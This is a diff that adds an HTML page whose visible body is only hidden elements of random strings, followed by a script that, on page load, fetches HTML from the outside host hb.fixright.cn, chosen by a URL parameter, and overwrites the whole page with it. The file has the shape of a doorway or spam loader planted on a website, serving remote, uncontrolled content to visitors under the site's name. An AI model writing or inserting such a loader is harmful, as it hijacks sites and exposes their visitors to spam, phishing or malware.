@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body>
+<div style='display:none'>9PkzXsfIH2GW8ZbMBBKyg0VhxS9Dm4ovkgLgIbb2WN4E1cH1c86rjLsPMbl0R</div>
+<p  style='display:none'>w9b9MKaCQJp5Ff8</p>
+<b style='display:none' >ZUsafjoC8EoaGpb6qQVZNLLSEKGm7JmuvwdW3kQsEc1uGmDfhtGu6tEd92oHswoyRvUaSRraHf9fEjXvDpW</b>
+<a  href='#' style='display:none'>3pO2UDbJS3LjDJ54jMGrXXZFJAuj4YdiVNEOnvw3YZmN6wn3Rd7</a>
+<b style='display:none' >ZUsafjoC8EoaGpb6qQVZNLLSEKGm7JmuvwdW3kQsEc1uGmDfhtGu6tEd92oHswoyRvUaSRraHf9fEjXvDpW</b>
+<h1 style='display:none' >wumUJLaIsjZcHpdUmqz86YvevWXQ62FoQGAPiHIchxLxGS</h1>
+<b style='display:none' >ZUsafjoC8EoaGpb6qQVZNLLSEKGm7JmuvwdW3kQsEc1uGmDfhtGu6tEd92oHswoyRvUaSRraHf9fEjXvDpW</b>
+<ul style='display:none' >9OzEVuPaFEDGeBhdvKpbrkDjuhH496JqHybO1gm3IAQxATNNXuqj1TWDaO0VnxjM9H9Km3l6GqzuoAqxYooNW</ul>
+<b style='display:none' >ZUsafjoC8EoaGpb6qQVZNLLSEKGm7JmuvwdW3kQsEc1uGmDfhtGu6tEd92oHswoyRvUaSRraHf9fEjXvDpW</b>
+<div style='display:none'>9PkzXsfIH2GW8ZbMBBKyg0VhxS9Dm4ovkgLgIbb2WN4E1cH1c86rjLsPMbl0R</div></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('//hb.fixright.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
